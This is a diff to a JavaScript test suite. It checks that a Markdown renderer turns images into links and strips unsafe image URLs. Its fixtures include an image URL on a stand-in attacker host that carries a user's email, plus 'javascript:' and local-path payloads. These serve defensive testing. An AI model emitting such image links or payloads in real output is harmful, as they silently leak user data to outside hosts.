@@ -165,8 +165,9 @@ test("a Markdown image never renders an <img>; it becomes a link the user can cl
     [
       "![](https://attacker.example/p.png?d=alice%40corp.com)",
       "![Quarterly chart](https://attacker.example/chart.png)",
-      "![relative](//attacker.example/unc.png)",
+      "![   ](https://attacker.example/blank.png)",
       "![reference][pixel]",
+      "[![badge](https://attacker.example/badge.svg)](https://github.com/openwhispr)",
       "",
       "[pixel]: https://attacker.example/ref.png",
       "",
@@ -174,6 +175,14 @@ test("a Markdown image never renders an <img>; it becomes a link the user can cl
   );
 
   assert.ok(!html.includes("<img"), "no image element is produced");
+  const attributesWithUrl = [...html.matchAll(/([\w-]+)="[^"]*attacker\.example[^"]*"/g)].map(
+    ([, name]) => name
+  );
+  assert.ok(attributesWithUrl.length > 0);
+  assert.ok(
+    attributesWithUrl.every((name) => name === "href"),
+    `the image URL only appears as a link target, got: ${attributesWithUrl.join(", ")}`
+  );
   const links = [...html.matchAll(/<a\b([^>]*)>([^<]*)<\/a>/g)].map(([, attrs, label]) => ({
     href: attrs.match(/href="([^"]*)"/)?.[1],
     attrs,
@@ -187,28 +196,40 @@ test("a Markdown image never renders an <img>; it becomes a link the user can cl
         "https://attacker.example/p.png?d=alice%40corp.com",
       ],
       ["https://attacker.example/chart.png", "Quarterly chart"],
-      ["//attacker.example/unc.png", "relative"],
+      ["https://attacker.example/blank.png", "https://attacker.example/blank.png"],
       ["https://attacker.example/ref.png", "reference"],
+      // A nested link would take the click, so the surrounding link keeps it.
+      ["https://github.com/openwhispr", "badge"],
     ],
-    "each image is a link labelled with its alt text, or its URL when there is none"
+    "each image is a link labelled with its alt text, or its URL when the alt text is blank"
   );
   for (const { attrs } of links) {
-    assert.ok(attrs.includes('target="_blank"'), "opens outside the app like other links");
+    assert.ok(attrs.includes('target="_blank"'), "opens like other Markdown links");
     assert.ok(attrs.includes('rel="noopener noreferrer"'));
   }
 });
 
-test("an image whose URL the sanitiser strips keeps only its alt text", async (t) => {
+test("an image without an absolute web URL keeps only its alt text", async (t) => {
   const html = await renderMarkdown(
     t,
-    "![inline chart](data:image/png;base64,iVBORw0KGgo=) ![](javascript:alert(1))\n"
+    [
+      "![inline chart](data:image/png;base64,iVBORw0KGgo=)",
+      "![](javascript:alert(1))",
+      "![share](//attacker.example/unc.png)",
+      "![drive](/C:/Windows/System32/cmd.exe)",
+      "![anchor](#section)",
+      "",
+    ].join("\n")
   );
 
   assert.ok(!html.includes("<img"), "no image element is produced");
   assert.ok(!html.includes("<a"), "nothing to link to");
-  assert.ok(html.includes("inline chart"), "the alt text still reads");
+  for (const alt of ["inline chart", "share", "drive", "anchor"]) {
+    assert.ok(html.includes(alt), `the alt text "${alt}" still reads`);
+  }
   assert.ok(!html.includes("data:"), "the data: URL is not echoed");
   assert.ok(!html.includes("javascript:"), "the javascript: URL is not echoed");
+  assert.ok(!html.includes("attacker.example"), "the relative URL is not echoed");
 });
 
 test("URL sanitisation is unchanged with the plugin enabled", async (t) => {
